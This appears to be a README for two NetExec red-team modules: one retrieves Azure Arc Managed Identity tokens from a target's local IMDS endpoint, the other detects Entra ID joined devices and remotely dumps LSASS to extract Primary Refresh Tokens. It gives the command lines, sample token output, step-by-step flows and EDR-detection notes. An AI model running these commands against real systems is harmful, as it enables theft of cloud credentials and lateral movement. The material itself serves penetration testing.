# NetExec Azure Identity Modules

Two specialized modules for Azure/Entra ID reconnaissance and credential extraction during penetration testing engagements.

---

## 📦 Module 1: `azurearc`

Enumerates Azure Arc presence on Windows targets and, when present, retrieves a **Managed Identity access token** from the local Arc IMDS endpoint using the documented **401 challenge → `.key` file → second request** flow.

* **Protocol:** SMB (requires local administrator privileges)
* **Primary use case:** Rapidly map Arc deployment and obtain a cloud-scoped token for Azure control-plane enumeration during red team engagements.

### ✨ Features

* **Presence check** (`CHECK=true`): Detects Arc agent by listing well-known install paths.
* **Token retrieval** (default): Executes the IMDS challenge/response locally on the target and returns JSON containing `access_token`.

### ⚙️ Usage

**Presence check only:**
```bash
nxc smb <target> -u <USER> -p <PASS> -M azurearc -o CHECK=true
```

**Token dump:**
```bash
nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc
```
```
[*] Attempting to retrieve Azure Arc Managed Identity access token
[+] Managed Identity token retrieved
{
  "access_token": "eyJhbGciOi......",
  "expires_on": "1730812345",
  "token_type": "Bearer",
  "resource": "https://management.azure.com"
}
```

### 🔍 How It Works

**Presence check via SMB listing:**
- `C:\Program Files\AzureConnectedMachineAgent*`
- `C:\Program Files (x86)\AzureConnectedMachineAgent*`

**Token retrieval on target (PowerShell):**
1. GET `http://localhost:40342/metadata/identity/oauth2/token?resource=...&api-version=...` → expect 401 with `WWW-Authenticate: Basic realm="<path to .key>"`
2. Read the `.key` contents (requires local admin)
3. Second GET with `Authorization: Basic` to obtain token JSON
4. Write JSON to temp file, fetch via SMB, and delete the file

### 📸 Screenshots

<img width="1201" height="450" alt="2025-10-05_16h20_40" src="https://github.com/user-attachments/assets/331bf94f-a2bc-428d-a804-2d22b009e9c0" />
<img width="1189" height="391" alt="2025-10-05_17h29_40" src="https://github.com/user-attachments/assets/4119cda4-1a80-413a-add5-79dcdd950a8f" />

### 🔒 OPSEC & Scope Notes

- Local admin required on the target (matches Arc's security boundary)
- Tokens are written to a temp file on the target only long enough to read back via SMB, then deleted
- Be mindful of token lifetime and endpoint logging

### 🧭 References

**NSIDE Attack Logic - Azure Arc - Part 1 - Escalation from On-Premises to Cloud**  
https://www.nsideattacklogic.de/azure-arc-part-1-escalation-from-on-premises-to-cloud/

---

## 📦 Module 2: `cloudap`

Detects **Azure AD (Entra ID) joined devices** and enumerates user profiles with **CloudAP/PRT artifacts**, then optionally dumps LSASS memory to extract Primary Refresh Tokens (PRTs) for Azure AD authentication bypass.

* **Protocol:** SMB (pure SMB operations for checks, admin required for dumps)
* **Primary use case:** Identify Azure AD joined machines, locate users with PRTs, and extract tokens for cloud lateral movement.

### ✨ Features

* **Azure AD join detection** (`ACTION=check`): Checks device join status via SMB, and enumerates user profiles with TokenBroker/NGC artifacts indicating likely PRT presence
* **LSASS dump** (`ACTION=dump`): Remotely dumps LSASS via lsassy, downloads locally, auto-parses CloudAP sections with pypykatz

### ⚙️ Usage

**Check Azure AD join status and scan for user artifacts:**
```bash
nxc smb <target> -u <USER> -p <PASS> -M cloudap -o ACTION=check
```
```
CLOUDAP     10.0.0.1        445    dev-machine1     [+] Device is AzureAdJoined
CLOUDAP     10.0.0.1        445    dev-machine1     [*] Scanning user profiles for AzureAD authentication artifacts...
CLOUDAP     10.0.0.1        445    dev-machine1     [+] Found 2 user(s) with AzureAD artifacts:
CLOUDAP     10.0.0.1        445    dev-machine1       • admin.dev-machine1: TokenBroker
CLOUDAP     10.0.0.1        445    dev-machine1       • brother: TokenBroker
```

**Dump LSASS and extract CloudAP credentials:**
```bash
nxc smb <target> -u <USER> -p <PASS> -M cloudap -o ACTION=dump METHOD=comsvcs SAVE_DIR=.
```
```
CLOUDAP     10.0.0.1        445    dev-machine1     [+] Dumping LSASS via lsassy (method: comsvcs)
CLOUDAP     10.0.0.1        445    dev-machine1     [+] Saved LSASS dump to /root/.nxc/modules/cloudap/10.0.0.1_lsass.dmp
CLOUDAP     10.0.0.1        445    dev-machine1     [+] cloudap section #1 (pypykatz):
        cloudap :
             PRT      : {"Prt":"eyJ0eXAiOi...","ProofOfPossesionKey":"...","TenantId":"..."}
             DPAPI Key: a1b2c3d4... (sha1: ...)
```

### 🔍 How It Works

**Azure AD join detection (ACTION=check):**
1. Connects to target via SMB using `C$` share
2. Lists `C$\Users\*` directory to enumerate user profiles
3. For each user, checks existence of Azure AD artifact paths, for example:
   - `AppData\Local\Microsoft\TokenBroker\Cache`
   - `AppData\Local\Microsoft\Ngc`
4. Reports users with artifacts (indicating likely PRT presence)

**LSASS dump flow (ACTION=dump):**
1. Uses **lsassy** to remotely dump LSASS memory (no binary uploads)
2. Downloads dump via SMB to local directory
3. Auto-parses dump with **pypykatz** library API
4. Extracts CloudAP sections containing PRTs, DPAPI keys, and metadata
5. Cleans up remote dump file

### 📸 Screenshots
<img width="1517" height="154" alt="2025-10-27_16h58_39" src="https://github.com/user-attachments/assets/9faf76dc-c0ed-4bdb-b4c4-5682e612d97b" />
<img width="1608" height="730" alt="2025-10-27_17h04_47" src="https://github.com/user-attachments/assets/acc7dc09-d5f6-4c23-abf7-efe66f82b538" />

### 🔒 OPSEC & Scope Notes

- **ACTION=dump** requires local admin and creates forensic artifacts (LSASS dump)
- Consider EDR detection when dumping LSASS memory

### 🧭 References

**Dirk-jan**  
https://dirkjanm.io/digging-further-into-the-primary-refresh-token/
https://dirkjanm.io/assets/raw/romhack_dirkjan.pdf

**pypykatz**  
http://github.com/skelsec/pypykatz

**lsassy**  
https://github.com/login-securite/lsassy

---

## 🛠️ Installation

Both modules are included in NetExec. Place the files in:
```
nxc/modules/azurearc.py
nxc/modules/cloudap.py
```

### Dependencies

**azurearc:** No additional dependencies  
**cloudap:** Requires `lsassy` and `pypykatz` for ACTION=dump
```bash
pip install lsassy pypykatz
```

---

## 📜 License

These modules are part of NetExec and follow the same license.


## ⚠️ Disclaimer

These tools are for educational purposes only.
